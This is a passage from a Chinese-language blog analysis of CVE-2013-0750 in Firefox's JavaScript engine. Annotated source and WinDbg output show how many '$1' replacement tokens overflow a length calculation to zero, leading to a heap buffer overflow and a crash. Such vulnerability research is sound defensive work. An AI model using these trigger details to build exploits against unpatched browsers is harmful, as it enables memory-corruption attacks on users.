<p>首先将dp指向首位置，ep指向末位置，而后调用js_strchr_limit查找”$”所在位置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">jschar *</span><br><span class="line">js_strchr_limit(<span class="keyword">const</span> jschar *s, jschar c, <span class="keyword">const</span> jschar *limit)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (s &lt; limit) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*s == c)</span><br><span class="line">            <span class="keyword">return</span> (jschar *)s;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;<span class="comment">//作用是查找字符，可以看到其实际返回的是最左端字符</span></span><br></pre></td></tr></table></figure>
<p><strong>找到”$“所在位置后，函数调用InterpretDollar，用于返回”$“位置需要替换的字符个数sub.length以及”$”位置本身占用的原空间skip，replen最初为表达式长度size_t replen = repstr-&gt;length()，因此在replen += sub.length - skip中便计算的是最终替换后字符串长度，其中InterpretDollar：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span></span><br><span class="line">InterpretDollar(JSContext *cx, RegExpStatics *res, <span class="keyword">const</span> jschar *dp, <span class="keyword">const</span> jschar *ep,</span><br><span class="line">                ReplaceData &amp;rdata, JSSubString *out, <span class="keyword">size_t</span> *skip)</span><br><span class="line">&#123;</span><br><span class="line">#初始位置为<span class="string">"$"</span></span><br><span class="line">    JS_ASSERT(*dp == <span class="string">'$'</span>);</span><br><span class="line">#判断字符串长度，即：判断是否为单一字符<span class="string">"$"</span></span><br><span class="line">    <span class="comment">/* If there is only a dollar, bail now */</span></span><br><span class="line">    <span class="keyword">if</span> (dp + <span class="number">1</span> &gt;= ep)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Interpret all Perl match-induced dollar variables. */</span></span><br><span class="line">    jschar dc = dp[<span class="number">1</span>];</span><br><span class="line"> #判断是否为十进制数，对应判断是否<span class="string">"$(1-99)"</span></span><br><span class="line">    <span class="keyword">if</span> (JS7_ISDEC(dc)) &#123;</span><br><span class="line">        <span class="comment">/* ECMA-262 Edition 3: 1-9 or 01-99 */</span></span><br><span class="line">        <span class="keyword">unsigned</span> num = JS7_UNDEC(dc);</span><br><span class="line">#此处JS7_UNDEC对字符处理，实际上是直接将ascii减<span class="number">0x30</span>,所以为了防止超出数字范围，在此处对大小进行了判断</span><br><span class="line">        <span class="keyword">if</span> (num &gt; res-&gt;parenCount())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">#判断是否为两位数并对两位数进行处理(包括<span class="string">"$01"</span>这种)</span><br><span class="line">        <span class="keyword">const</span> jschar *cp = dp + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (cp &lt; ep &amp;&amp; (dc = *cp, JS7_ISDEC(dc))) &#123;</span><br><span class="line">            <span class="keyword">unsigned</span> tmp = <span class="number">10</span> * num + JS7_UNDEC(dc);</span><br><span class="line">            <span class="keyword">if</span> (tmp &lt;= res-&gt;parenCount()) &#123;</span><br><span class="line">                cp++;</span><br><span class="line">                num = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#数字为<span class="number">0</span>，返回False</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">#*skip为<span class="string">"$"</span>元素长度，例：<span class="string">"$1"</span>对应<span class="number">2</span>，<span class="string">"$99"</span>对应<span class="number">3</span></span><br><span class="line">        *skip = cp - dp;</span><br><span class="line">#与上面的判断类似，因为处理过程是对ascii处理，防止大小超出范围而进行判断</span><br><span class="line">        JS_ASSERT(num &lt;= res-&gt;parenCount());</span><br><span class="line">#将对应匹配的字符串(num)传入参数out位置，以便返回</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Note: we index to get the paren with the (1-indexed) pair</span></span><br><span class="line"><span class="comment">         * number, as opposed to a (0-indexed) paren number.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        res-&gt;getParen(num, out);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *skip = <span class="number">2</span>;</span><br><span class="line">#对应不是数字的特殊情况，<span class="string">"$$"</span>、<span class="string">"$&amp;"</span>......，具体参照js语法</span><br><span class="line">    <span class="keyword">switch</span> (dc) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'$'</span>:</span><br><span class="line">        rdata.dollarStr.chars = dp;</span><br><span class="line">        rdata.dollarStr.length = <span class="number">1</span>;</span><br><span class="line">        *out = rdata.dollarStr;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'&amp;'</span>:</span><br><span class="line">        res-&gt;getLastMatch(out);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">        res-&gt;getLastParen(out);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'`'</span>:</span><br><span class="line">        res-&gt;getLeftContext(out);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'\''</span>:</span><br><span class="line">        res-&gt;getRightContext(out);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由此分析，在FindReplaceLength中，在前面的POC下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    JSString *repstr = rdata.repstr;</span><br><span class="line">    <span class="keyword">size_t</span> replen = repstr-&gt;length();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> jschar *dp = rdata.dollar, *ep = rdata.dollarEnd; dp;</span><br><span class="line">         dp = js_strchr_limit(dp, <span class="string">'$'</span>, ep)) &#123;</span><br><span class="line">        JSSubString sub;</span><br><span class="line">        <span class="keyword">size_t</span> skip;</span><br><span class="line">        <span class="keyword">if</span> (InterpretDollar(cx, res, dp, ep, rdata, &amp;sub, &amp;skip)) &#123;</span><br><span class="line"><span class="meta">#replen不断+=0x100000-2,且初始值为0x10000</span></span><br><span class="line">#因为有<span class="number">0x10000</span>/<span class="number">2</span>个<span class="string">"$1"</span>，故而进行<span class="number">0x10000</span>/<span class="number">2</span>次操作</span><br><span class="line">#最终<span class="number">0x10000</span>+<span class="number">0xffffe</span>*<span class="number">0x10000</span>/<span class="number">2</span>=<span class="number">0x800000000</span></span><br><span class="line">#在<span class="number">32</span>位下(<span class="number">64</span>位增加长度即可)，最终fff00002+<span class="number">0xffffe</span>=<span class="number">0x00000000</span>,造成整数溢出</span><br><span class="line">            replen += sub.length - skip;</span><br><span class="line">            dp += skip;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dp++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">#*sizep=<span class="number">0</span></span><br><span class="line">    *sizep = replen;</span><br></pre></td></tr></table></figure>
<p>而后返回ReplaceRegExpCallback：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!FindReplaceLength(cx, res, rdata, &amp;replen))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#growth为最终替换后字符长度</span></span><br><span class="line">#简单说明：在真正替换被替换字符前，因为存在<span class="string">"$"</span>这类语法</span><br><span class="line">#需要将替换字符处理为最终的字符，replen即为此字符串长度</span><br><span class="line"><span class="meta">#leftlen是正则匹配前字符串的长度(没被匹配到的字符)</span></span><br><span class="line"><span class="meta">#leftlen+replen=原字符串不需要替换的部分+此次替换的最终长度=最终长度</span></span><br><span class="line">    <span class="keyword">size_t</span> growth = leftlen + replen;</span><br><span class="line"><span class="meta">#rdata.sb.length()初始为0，sb定义为buffer built during DoMatch,为Domatch分配给此rdata的空间大小，动态调试此处为0 </span></span><br><span class="line">    <span class="keyword">if</span> (!rdata.sb.reserve(rdata.sb.length() + growth))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
<p>所以最终调用的是rdata.sb.reserve(0)，这里并不是因为此处参数为0，而分配更少的空间，造成堆溢出<br>看到reverse操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Vector&lt;T,N,AP&gt;::reserve(<span class="keyword">size_t</span> request)</span><br><span class="line">&#123;</span><br><span class="line">    REENTRANCY_GUARD_ET_AL;</span><br><span class="line">#利用短路运算</span><br><span class="line">#只有当request &gt; mCapacity时才会执行growStorageBy</span><br><span class="line">#growStorageBy将重新<span class="built_in">malloc</span>一个空间存储数据</span><br><span class="line">    <span class="keyword">if</span> (request &gt; mCapacity &amp;&amp; !growStorageBy(request - mLength))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="keyword">if</span> (request &gt; mReserved)</span><br><span class="line">        mReserved = request;</span><br><span class="line">    JS_ASSERT(mLength &lt;= mReserved);</span><br><span class="line">    JS_ASSERT(mReserved &lt;= mCapacity);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上此时因为整数溢出传参为0，request &lt; mCapacity(动态调试看到此值为0x20)，导致短路运算不会进行growStorageBy，并没有分配堆的操作，而后程序调用DoReplace：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">DoReplace(JSContext *cx, RegExpStatics *res, ReplaceData &amp;rdata)</span><br><span class="line">&#123;</span><br><span class="line">    JSLinearString *repstr = rdata.repstr;</span><br><span class="line">    <span class="keyword">const</span> jschar *cp;</span><br><span class="line">    <span class="keyword">const</span> jschar *bp = cp = repstr-&gt;chars();</span><br><span class="line">#指向初始位置和结束位置</span><br><span class="line">    <span class="keyword">const</span> jschar *dp = rdata.dollar;</span><br><span class="line">    <span class="keyword">const</span> jschar *ep = rdata.dollarEnd;</span><br><span class="line">#查找替换字符中<span class="string">"$"</span>位置</span><br><span class="line">    <span class="keyword">for</span> (; dp; dp = js_strchr_limit(dp, <span class="string">'$'</span>, ep)) &#123;</span><br><span class="line">        <span class="comment">/* Move one of the constant portions of the replacement value. */</span></span><br><span class="line">        <span class="keyword">size_t</span> len = dp - cp;</span><br><span class="line">        rdata.sb.infallibleAppend(cp, len);</span><br><span class="line">        cp = dp;</span><br><span class="line"></span><br><span class="line">        JSSubString sub;</span><br><span class="line">        <span class="keyword">size_t</span> skip;</span><br><span class="line">#查找到<span class="string">"$"</span>对应匹配的字符串即长度并返回</span><br><span class="line">        <span class="keyword">if</span> (InterpretDollar(cx, res, dp, ep, rdata, &amp;sub, &amp;skip)) &#123;</span><br><span class="line">            len = sub.length;</span><br><span class="line">            rdata.sb.infallibleAppend(sub.chars, len);</span><br><span class="line">            cp += skip;</span><br><span class="line">            dp += skip;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dp++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    rdata.sb.infallibleAppend(cp, repstr-&gt;length() - (cp - bp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没有去寻找源码，rdata.sb.infallibleAppend的操作在IDA下可以直接看到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#事实上就是一个copy操作</span><br><span class="line">v11 = sub.chars;</span><br><span class="line">v12 = &amp;sub.chars[sub.length];</span><br><span class="line"><span class="keyword">if</span> ( sub.chars != v12 )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123; *v10 = *v11;</span><br><span class="line">            ++v11;</span><br><span class="line">            ++v10;</span><br><span class="line">       &#125;<span class="keyword">while</span> ( v11 != v12 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为前面的整数溢出，实际上从request &lt; mCapacity中也可以看到，真正分配的缓冲区大小为0x20,所以当将过长的字符串存入此缓冲区便会造成溢出,最终：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:000:x86&gt; g</span><br><span class="line">(67ec.127c): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">&gt; 2067:             rdata.sb.infallibleAppend(sub.chars, len);</span><br></pre></td></tr></table></figure>
<p>我们看到此时要写入的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53530583 668919          mov     word ptr [ecx],bx        ds:002b:01300000&#x3D;0020</span><br></pre></td></tr></table></figure>
<p>此处权限：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:000:x86&gt; !address 0x1300000</span><br><span class="line"></span><br><span class="line">                                     </span><br><span class="line">Usage:                  MemoryMappedFile</span><br><span class="line">Allocation Base:        01300000</span><br><span class="line">Base Address:           01300000</span><br><span class="line">End Address:            013c5000</span><br><span class="line">Region Size:            000c5000</span><br><span class="line">Type:                   00040000	MEM_MAPPED</span><br><span class="line">State:                  00001000	MEM_COMMIT</span><br><span class="line">Protect:                00000002	PAGE_READONLY</span><br><span class="line">Mapped file name:       \Device\HarddiskVolume3\Windows\System32\locale.nls</span><br></pre></td></tr></table></figure>
<p><strong>只有读权限，因而当因为溢出向此处写入数据时会造成crash</strong></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Building-Environment-for-Debug"><span class="toc-number">1.</span> <span class="toc-text">Building Environment for Debug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-code"><span class="toc-number">1.1.</span> <span class="toc-text">Source code:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compile"><span class="toc-number">1.2.</span> <span class="toc-text">Compile:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Environment"><span class="toc-number">1.2.1.</span> <span class="toc-text">Environment</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#To-compile"><span class="toc-number">1.2.2.</span> <span class="toc-text">To compile</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debug-Environment"><span class="toc-number">1.3.</span> <span class="toc-text">Debug Environment</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze"><span class="toc-number">2.</span> <span class="toc-text">Analyze</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&text=CVE-2013-0750  Firefox" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&title=CVE-2013-0750  Firefox" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&is_video=false&description=CVE-2013-0750  Firefox" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2013-0750  Firefox&body=Check out this article: http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&title=CVE-2013-0750  Firefox" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&title=CVE-2013-0750  Firefox" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&title=CVE-2013-0750  Firefox" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&title=CVE-2013-0750  Firefox" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/02/CVE-2013-0750-Firefox/&name=CVE-2013-0750  Firefox&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


